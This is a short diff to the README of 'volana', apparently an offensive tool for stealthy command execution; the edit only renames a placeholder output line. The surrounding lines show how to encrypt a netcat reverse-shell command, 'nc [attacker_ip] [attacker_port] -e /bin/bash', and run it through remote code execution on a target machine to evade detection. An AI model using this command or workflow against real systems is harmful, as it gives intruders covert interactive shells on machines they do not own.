@@ -45,7 +45,7 @@ make build.volana-with-encryption
 ## Encrypt the command you want to stealthy execute
 ## (Here a nc bindshell to obtain a interactive shell)
 volana encr "nc [attacker_ip] [attacker_port] -e /bin/bash"
-**encrypted cmd**
+>>> ENCRYPTED COMMAND
 ```
 
 Copy encrypted command and executed it with your rce **on target machine**
